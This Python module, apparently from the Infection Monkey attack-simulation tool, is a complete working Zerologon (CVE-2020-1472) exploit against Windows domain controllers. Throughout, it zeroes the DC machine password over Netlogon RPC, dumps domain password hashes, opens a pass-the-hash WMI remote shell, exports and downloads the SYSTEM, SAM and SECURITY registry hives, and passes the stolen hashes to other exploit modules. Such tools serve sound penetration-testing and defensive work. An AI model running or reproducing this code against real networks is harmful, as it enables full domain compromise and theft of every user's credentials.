"""
Zerologon, CVE-2020-1472
Implementation based on https://github.com/dirkjanm/CVE-2020-1472/ and https://github.com/risksense/zerologon/.
"""

import logging
import os
import re
from binascii import unhexlify
from typing import Dict, List, Optional, Tuple

import impacket
from impacket.dcerpc.v5 import epm, nrpc, rpcrt, transport
from impacket.dcerpc.v5.dtypes import NULL

from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.zerologon_utils.dump_secrets import DumpSecrets
from infection_monkey.exploit.zerologon_utils.options import OptionsForSecretsdump
from infection_monkey.exploit.zerologon_utils.vuln_assessment import (
    get_dc_details, is_exploitable)
from infection_monkey.exploit.zerologon_utils.wmiexec import Wmiexec
from infection_monkey.utils.capture_output import StdoutCapture


LOG = logging.getLogger(__name__)


class ZerologonExploiter(HostExploiter):
    _TARGET_OS_TYPE = ["windows"]
    _EXPLOITED_SERVICE = "Netlogon"
    EXPLOIT_TYPE = ExploitType.VULNERABILITY
    RUNS_AGENT_ON_SUCCESS = False
    MAX_ATTEMPTS = 2000  # For 2000, expected average number of attempts needed: 256.
    ERROR_CODE_ACCESS_DENIED = 0xC0000022

    def __init__(self, host: object):
        super().__init__(host)
        self.vulnerable_port = None
        self.exploit_info["credentials"] = {}
        self.exploit_info["password_restored"] = None
        self._extracted_creds = {}

    def _exploit_host(self) -> bool:
        self.dc_ip, self.dc_name, self.dc_handle = get_dc_details(self.host)

        can_exploit, rpc_con = is_exploitable(self)
        if can_exploit:
            LOG.info("Target vulnerable, changing account password to empty string.")

            # Start exploiting attempts.
            LOG.debug("Attempting exploit.")
            _exploited = self._send_exploit_rpc_login_requests(rpc_con)

            rpc_con.disconnect()

        else:
            LOG.info(
                "Exploit not attempted. Target is most likely patched, or an error was encountered."
            )
            return False

        # Restore DC's original password.
        if _exploited:
            if self.restore_password():
                self.exploit_info["password_restored"] = True
                self.store_extracted_creds_for_exploitation()
                LOG.info("System exploited and password restored successfully.")
            else:
                self.exploit_info["password_restored"] = False
                LOG.info("System exploited but couldn't restore password!")
        else:
            LOG.info("System was not exploited.")

        return _exploited

    @staticmethod
    def connect_to_dc(dc_ip) -> object:
        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        rpc_con.connect()
        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
        return rpc_con

    def _send_exploit_rpc_login_requests(self, rpc_con) -> bool:
        for _ in range(0, self.MAX_ATTEMPTS):
            exploit_attempt_result = self.try_exploit_attempt(rpc_con)

            is_exploited = self.assess_exploit_attempt_result(exploit_attempt_result)
            if is_exploited:
                return True

        return False

    def try_exploit_attempt(self, rpc_con) -> Optional[object]:
        try:
            exploit_attempt_result = self.attempt_exploit(rpc_con)
            return exploit_attempt_result
        except nrpc.DCERPCSessionError as e:
            # Failure should be due to a STATUS_ACCESS_DENIED error.
            # Otherwise, the attack is probably not working.
            if e.get_error_code() != self.ERROR_CODE_ACCESS_DENIED:
                LOG.info(f"Unexpected error code from DC: {e.get_error_code()}")
        except BaseException as e:
            LOG.info(f"Unexpected error: {e}")

    def attempt_exploit(self, rpc_con: rpcrt.DCERPC_v5) -> object:
        request = nrpc.NetrServerPasswordSet2()
        ZerologonExploiter._set_up_request(request, self.dc_name)
        request["PrimaryName"] = self.dc_handle + "\x00"
        request["ClearNewPassword"] = b"\x00" * 516

        return rpc_con.request(request)

    @staticmethod
    def _set_up_request(request: nrpc.NetrServerPasswordSet2, dc_name: str) -> None:
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator["Credential"] = b"\x00" * 8
        authenticator["Timestamp"] = b"\x00" * 4

        request["AccountName"] = dc_name + "$\x00"
        request["ComputerName"] = dc_name + "\x00"
        request[
            "SecureChannelType"
        ] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        request["Authenticator"] = authenticator

    def assess_exploit_attempt_result(self, exploit_attempt_result) -> bool:
        if exploit_attempt_result:
            if exploit_attempt_result["ErrorCode"] == 0:
                self.report_login_attempt(result=True, user=self.dc_name)
                _exploited = True
                LOG.info("Exploit complete!")
            else:
                self.report_login_attempt(result=False, user=self.dc_name)
                _exploited = False
                LOG.info(
                    f"Non-zero return code: {exploit_attempt_result['ErrorCode']}. Something went wrong."
                )
            return _exploited

        return False

    def restore_password(self) -> bool:
        LOG.info("Restoring original password...")

        try:
            rpc_con = None

            # DCSync to get usernames and their passwords' hashes.
            LOG.debug("DCSync; getting usernames and their passwords' hashes.")
            user_creds = self.get_all_user_creds()
            if not user_creds:
                raise Exception(
                    "Couldn't extract any usernames and/or their passwords' hashes."
                )

            # Use above extracted credentials to get original DC password's hashes.
            LOG.debug("Getting original DC password's NT hash.")
            original_pwd_nthash = None
            for user_details in user_creds:
                username = user_details[0]
                user_pwd_hashes = [
                    user_details[1]["lm_hash"],
                    user_details[1]["nt_hash"],
                ]
                try:
                    original_pwd_nthash = self.get_original_pwd_nthash(
                        username, user_pwd_hashes
                    )
                    if original_pwd_nthash:
                        break
                except Exception as e:
                    LOG.info(
                        f"Credentials didn\'t work. Exception: {str(e)}"
                    )

            if not original_pwd_nthash:
                raise Exception("Couldn't extract original DC password's NT hash.")

            # Connect to the DC's Netlogon service.
            try:
                rpc_con = ZerologonExploiter.connect_to_dc(self.dc_ip)
            except Exception as e:
                LOG.info(f"Exception occurred while connecting to DC: {str(e)}")
                return False

            # Start restoration attempts.
            LOG.debug("Attempting password restoration.")
            _restored = self._send_restoration_rpc_login_requests(
                rpc_con, original_pwd_nthash
            )
            if not _restored:
                raise Exception("Failed to restore password! Max attempts exceeded?")

            return _restored

        except Exception as e:
            LOG.error(e)
            return False

        finally:
            if rpc_con:
                rpc_con.disconnect()

    def get_all_user_creds(self) -> List[Tuple[str, Dict]]:
        try:
            options = OptionsForSecretsdump(
                target=f"{self.dc_name}$@{self.dc_ip}",  # format for DC account - "NetBIOSName$@0.0.0.0"
                target_ip=self.dc_ip,
                dc_ip=self.dc_ip,
            )

            dumped_secrets = self.get_dumped_secrets(
                remote_name=self.dc_ip, username=f"{self.dc_name}$", options=options
            )

            self._extract_user_creds_from_secrets(dumped_secrets=dumped_secrets)

            creds_to_use_for_getting_original_pwd_hashes = []
            admin = "Administrator"
            for user in self._extracted_creds.keys():
                if user == admin:  # most likely to work so try this first
                    creds_to_use_for_getting_original_pwd_hashes.insert(
                        0, (user, self._extracted_creds[user])
                    )
                else:
                    creds_to_use_for_getting_original_pwd_hashes.append(
                        (user, self._extracted_creds[user])
                    )

            return creds_to_use_for_getting_original_pwd_hashes

        except Exception as e:
            LOG.info(
                f"Exception occurred while dumping secrets to get some username and its password's NT hash: {str(e)}"
            )

        return None

    def get_dumped_secrets(
        self,
        remote_name: str = "",
        username: str = "",
        options: Optional[object] = None,
    ) -> List[str]:
        dumper = DumpSecrets(
            remote_name=remote_name, username=username, options=options
        )
        dumped_secrets = dumper.dump().split("\n")
        return dumped_secrets

    def _extract_user_creds_from_secrets(self, dumped_secrets: List[str]) -> None:
        # format of secret we're looking for - "domain\uid:rid:lmhash:nthash:::"
        re_phrase = r"([\S]*[:][0-9]*[:][a-zA-Z0-9]*[:][a-zA-Z0-9]*[:][:][:])"

        for line in dumped_secrets:
            secret = re.fullmatch(pattern=re_phrase, string=line)
            if secret:
                parts_of_secret = secret[0].split(":")
                user = parts_of_secret[0].split("\\")[-1]  # we don't want the domain
                user_RID, lmhash, nthash = parts_of_secret[1:4]

                self._extracted_creds[user] = {
                    "RID": int(user_RID),  # relative identifier
                    "lm_hash": lmhash,
                    "nt_hash": nthash,
                }

    def store_extracted_creds_for_exploitation(self) -> None:
        for user in self._extracted_creds.keys():
            self.add_extracted_creds_to_exploit_info(
                user,
                self._extracted_creds[user]["lm_hash"],
                self._extracted_creds[user]["nt_hash"],
            )
            self.add_extracted_creds_to_monkey_config(
                user,
                self._extracted_creds[user]["lm_hash"],
                self._extracted_creds[user]["nt_hash"],
            )

    def add_extracted_creds_to_exploit_info(
        self, user: str, lmhash: str, nthash: str
    ) -> None:
        self.exploit_info["credentials"].update(
            {
                user: {
                    "username": user,
                    "password": "",
                    "lm_hash": lmhash,
                    "ntlm_hash": nthash,
                }
            }
        )

    # so other exploiters can use these creds
    def add_extracted_creds_to_monkey_config(
        self, user: str, lmhash: str, nthash: str
    ) -> None:
        if user not in self._config.exploit_user_list:
            self._config.exploit_user_list.append(user)

        if lmhash not in self._config.exploit_lm_hash_list:
            self._config.exploit_lm_hash_list.append(lmhash)

        if nthash not in self._config.exploit_ntlm_hash_list:
            self._config.exploit_ntlm_hash_list.append(nthash)

    def get_original_pwd_nthash(self, username: str, user_pwd_hashes: List[str]) -> str:
        if not self.save_HKLM_keys_locally(username, user_pwd_hashes):
            return

        try:
            options = OptionsForSecretsdump(
                dc_ip=self.dc_ip,
                just_dc=False,
                system=os.path.join(os.path.expanduser("~"), "monkey-system.save"),
                sam=os.path.join(os.path.expanduser("~"), "monkey-sam.save"),
                security=os.path.join(os.path.expanduser("~"), "monkey-security.save"),
            )

            dumped_secrets = self.get_dumped_secrets(
                remote_name="LOCAL", options=options
            )
            for secret in dumped_secrets:
                if (
                    "$MACHINE.ACC: " in secret
                ):  # format of secret - "$MACHINE.ACC: lmhash:nthash"
                    nthash = secret.split(":")[2]
                    return nthash

        except Exception as e:
            LOG.info(
                f"Exception occurred while dumping secrets to get original DC password's NT hash: {str(e)}"
            )

        finally:
            self.remove_locally_saved_HKLM_keys()

    def save_HKLM_keys_locally(self, username: str, user_pwd_hashes: List[str]) -> bool:
        LOG.info(
            f'Starting remote shell on victim with credentials:\n'
            f'user: {username}\n'
            f'hashes (SHA-512): {self._config.hash_sensitive_data(user_pwd_hashes[0])} : '
            f'{self._config.hash_sensitive_data(user_pwd_hashes[1])}'
        )

        wmiexec = Wmiexec(
            ip=self.dc_ip, username=username, hashes=':'.join(user_pwd_hashes), domain=self.dc_ip
        )

        remote_shell = wmiexec.get_remote_shell()
        if remote_shell:
            with StdoutCapture() as output_captor:
                try:
                    # Save HKLM keys on victim.
                    remote_shell.onecmd(
                        "reg save HKLM\\SYSTEM system.save && "
                        + "reg save HKLM\\SAM sam.save && "
                        + "reg save HKLM\\SECURITY security.save"
                    )

                    # Get HKLM keys locally (can't run these together because it needs to call do_get()).
                    remote_shell.onecmd("get system.save")
                    remote_shell.onecmd("get sam.save")
                    remote_shell.onecmd("get security.save")

                    # Delete saved keys on victim.
                    remote_shell.onecmd("del /f system.save sam.save security.save")

                    wmiexec.close()

                    return True

                except Exception as e:
                    LOG.info(f"Exception occured: {str(e)}")

                finally:
                    info = output_captor.get_captured_stdout_output()
                    LOG.debug(f"Getting victim HKLM keys via remote shell: {info}")

        else:
            raise Exception("Could not start remote shell on DC.")

        return False

    def remove_locally_saved_HKLM_keys(self) -> None:
        for name in ["system", "sam", "security"]:
            path = os.path.join(os.path.expanduser("~"), f"monkey-{name}.save")
            try:
                os.remove(path)
            except Exception as e:
                LOG.info(
                    f"Exception occurred while removing file {path} from system: {str(e)}"
                )

    def _send_restoration_rpc_login_requests(
        self, rpc_con, original_pwd_nthash
    ) -> bool:
        for _ in range(0, self.MAX_ATTEMPTS):
            restoration_attempt_result = self.try_restoration_attempt(
                rpc_con, original_pwd_nthash
            )

            is_restored = self.assess_restoration_attempt_result(
                restoration_attempt_result
            )
            if is_restored:
                return is_restored

        return False

    def try_restoration_attempt(
        self, rpc_con: rpcrt.DCERPC_v5, original_pwd_nthash: str
    ) -> Optional[object]:
        try:
            restoration_attempt_result = self.attempt_restoration(
                rpc_con, original_pwd_nthash
            )
            return restoration_attempt_result
        except nrpc.DCERPCSessionError as e:
            # Failure should be due to a STATUS_ACCESS_DENIED error.
            # Otherwise, the attack is probably not working.
            if e.get_error_code() != self.ERROR_CODE_ACCESS_DENIED:
                LOG.info(f"Unexpected error code from DC: {e.get_error_code()}")
        except BaseException as e:
            LOG.info(f"Unexpected error: {e}")

        return False

    def attempt_restoration(
        self, rpc_con: rpcrt.DCERPC_v5, original_pwd_nthash: str
    ) -> Optional[object]:
        plaintext = b"\x00" * 8
        ciphertext = b"\x00" * 8
        flags = 0x212FFFFF

        # Send challenge and authentication request.
        server_challenge_response = nrpc.hNetrServerReqChallenge(
            rpc_con, self.dc_handle + "\x00", self.dc_name + "\x00", plaintext
        )
        server_challenge = server_challenge_response["ServerChallenge"]

        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con,
            self.dc_handle + "\x00",
            self.dc_name + "$\x00",
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            self.dc_name + "\x00",
            ciphertext,
            flags,
        )

        assert server_auth["ErrorCode"] == 0
        session_key = nrpc.ComputeSessionKeyAES(
            None,
            b"\x00" * 8,
            server_challenge,
            unhexlify("31d6cfe0d16ae931b73c59d7e0c089c0"),
        )

        try:
            nrpc.NetrServerPasswordSetResponse = NetrServerPasswordSetResponse
            nrpc.OPNUMS[6] = (NetrServerPasswordSet, nrpc.NetrServerPasswordSetResponse)

            request = NetrServerPasswordSet()
            ZerologonExploiter._set_up_request(request, self.dc_name)
            request["PrimaryName"] = NULL
            pwd_data = impacket.crypto.SamEncryptNTLMHash(
                unhexlify(original_pwd_nthash), session_key
            )
            request["UasNewPassword"] = pwd_data

            rpc_con.request(request)

        except Exception as e:
            LOG.info(f"Unexpected error: {e}")

        return rpc_con

    def assess_restoration_attempt_result(self, restoration_attempt_result) -> bool:
        if restoration_attempt_result:
            LOG.debug(
                "DC machine account password should be restored to its original value."
            )
            return True

        return False


class NetrServerPasswordSet(nrpc.NDRCALL):
    opnum = 6
    structure = (
        ("PrimaryName", nrpc.PLOGONSRV_HANDLE),
        ("AccountName", nrpc.WSTR),
        ("SecureChannelType", nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
        ("ComputerName", nrpc.WSTR),
        ("Authenticator", nrpc.NETLOGON_AUTHENTICATOR),
        ("UasNewPassword", nrpc.ENCRYPTED_NT_OWF_PASSWORD),
    )


class NetrServerPasswordSetResponse(nrpc.NDRCALL):
    structure = (
        ("ReturnAuthenticator", nrpc.NETLOGON_AUTHENTICATOR),
        ("ErrorCode", nrpc.NTSTATUS),
    )
